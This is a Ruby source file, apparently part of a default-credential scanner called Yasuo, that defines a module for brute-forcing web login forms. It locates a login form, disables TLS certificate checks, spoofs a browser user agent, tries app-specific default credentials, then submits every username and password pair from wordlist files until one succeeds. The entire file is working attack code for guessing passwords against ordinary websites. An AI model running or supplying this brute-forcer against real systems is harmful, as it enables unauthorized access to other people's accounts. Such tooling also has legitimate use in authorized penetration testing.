require "mechanize"
require "net/http"
require "net/https"
require "nokogiri"
require "uri"


# A simple wrapper around Mechanize to help automate brute forcing a login
# form on a webpage.
module LoginFormBruteForcer

  module_function

  # Returns an enumeration of usernames and passwords pulled from the supplied
  # text files. (Each line in the given files is expected to be a username
  # or password)
  def usernames_and_passwords(users_file="users.txt", password_file="pass.txt")
    Enumerator.new do |enum|
      File.open(users_file, "r").each do |user|
        File.open(password_file, "r").each do |password|
          enum.yield user, password
        end
      end
    end
  end

  # Attempts to bruteforce a login to supplied url.
  def brute_by_force(url,dcreds)
    login_agent = Mechanize.new { |agent| agent.user_agent_alias = 'Mac Safari' }
    login_agent.verify_mode = OpenSSL::SSL::VERIFY_NONE
    login_agent.follow_meta_refresh = true
    #login_agent.set_proxy("localhost", 8080)    #To send login request through a proxy. Mostly for debugging.

    login_form = login_agent.get(url).form(:name => /login/)

    # login_form could be nil in case of an exception or if the login form does
    # not exist. The checks in Yasuo.rb are weak.
    if not login_form
      $logboth.info("Login page not found. Looks like this instance maybe unauthenticated")
      return "<None>", "<None>"
    end

    username_field = login_form.field_with(name: /user|email|login|REGEMAIL|name/i)
    password_field = login_form.field_with(name: /pass|pwd|REGCODE/i)
    if not username_field
      $logboth.warn ("[+] Could not enumerate the username field, moving on. You should check it manually")
      puts ("[+] Could not enumerate the username field, moving on. You should check it manually").red
      username = "<Check Manually>"
      password = "<Check Manually>"
      return username, password
    end

    #Smart brute-force code starts here
    username = dcreds.split(':')[0].chomp
    password = dcreds.split(':')[1].chomp
    username_field.value = username
    password_field.value = password

    begin
      $logfile.info("Trying app-specific default creds first -> #{dcreds}")
      puts ("[+] Trying app-specific default creds first -> #{dcreds}\n").green

      login_request = login_form.submit
      #puts login_request.body   #To print server response. Mostly for debugging.

      sleep 0.5

      # we determine if we have logged in by looking to see if we are on
      # a page with the login form.
      if (!login_request.form_with(:name => 'login') and
          login_request.body.scan(/"#{username_field.name}"/i).empty? and
          login_request.body.scan(/"#{username_field.name}"/i).empty?)
        puts "[+] Yatta, found default login credentials for #{url} - #{username}:#{password}\n".green
        $logfile.info("[+] Yatta, found default login credentials for #{url} - #{username} / #{password}")
        return username, password
      end
    rescue Mechanize::ResponseCodeError => exception
      if (exception.response_code != '200' or
          exception.response_code != '301' or
          exception.response_code != '302')
        # These response codes are handled by Mechanize
        login_request = exception.page
        $logfile.warn("Invalid credentials or user does not have sufficient privileges")
      else
        $logboth.info("Unknown server error")
      end
    end
    #Smart brute-force code ends here    

    usernames_and_passwords.each do |user, pass|
      username = user.chomp
      password = pass.chomp

      username_field.value = username
      password_field.value = password

      begin
        $logfile.info("Trying combination --> #{username}/#{password}")

        login_request = login_form.submit

        sleep 0.5

        # we determine if we have logged in by looking to see if we are on
        # a page with the login form.
        if (!login_request.form_with(:name => 'login') and
            login_request.body.scan(/"#{username_field.name}"/i).empty? and
            login_request.body.scan(/"#{username_field.name}"/i).empty?)
          puts "[+] Yatta, found default login credentials for #{url} - #{username} / #{password}\n".green
          $logfile.info("[+] Yatta, found default login credentials for #{url} - #{username} / #{password}")
          return username, password
        end
      rescue Mechanize::ResponseCodeError => exception
        if (exception.response_code != '200' or
            exception.response_code != '301' or
            exception.response_code != '302')
          # These response codes are handled by Mechanize
          login_request = exception.page
          $logfile.warn("Invalid credentials or user does not have sufficient privileges")
        else
          $logboth.info("Unknown server error")
        end
      end
    end

    $logfile.info("Could not find default credentials, sucks")
    puts "Could not find default login credentials, sucks".red
    return "Not Found", "Not Found"
  end
end